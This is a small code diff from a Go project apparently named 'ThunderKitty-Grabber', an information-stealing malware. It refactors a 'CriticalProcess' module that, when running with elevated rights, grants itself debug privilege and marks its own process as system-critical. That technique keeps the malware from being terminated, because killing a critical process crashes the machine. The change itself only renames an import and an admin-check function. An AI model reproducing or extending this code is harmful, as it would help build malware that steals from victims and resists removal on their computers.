@@ -1,12 +1,12 @@
 package CriticalProcess
 
 import (
-	Persistence "ThunderKitty-Grabber/utils/persistence"
+	Common "ThunderKitty-Grabber/utils/common"
 	"github.com/EvilBytecode/GoDefender/Process/CriticalProcess"
 )
 
 func Set() {
-	if Persistence.IsAdmin() {
+	if Common.IsElevated() {
 		programutils.SetDebugPrivilege()
 		programutils.SetProcessCritical()
 	}
